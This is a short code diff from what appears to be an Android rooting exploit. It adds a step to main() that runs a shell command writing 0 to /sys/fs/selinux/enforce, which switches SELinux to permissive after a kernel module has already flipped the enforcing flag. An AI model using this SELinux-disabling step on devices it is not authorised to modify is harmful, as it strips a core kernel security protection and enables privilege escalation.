@@ -455,6 +455,14 @@ static int disable_modules(void)
 
 int main(void)
 {
+    /* Sync the selinuxfs view of the enforcing switch dfroot.ko already
+     * flipped (byte0 of selinux_state).  Doing this HERE - not in module_init
+     * - matters twice over: a selinuxfs write inside the module load stalled
+     * the exploit (v1.19, v1.42), and only after the byte write is the
+     * selinuxfs write itself permitted.  Best effort either way. */
+    run_ctx(NULL, (char *[]){ "/system/bin/sh", "-c",
+        "echo 0 > /sys/fs/selinux/enforce", NULL });
+
     touch("/dev/dfm1");
     char su_manager[256];
     int soft_reboot, disable_mods;
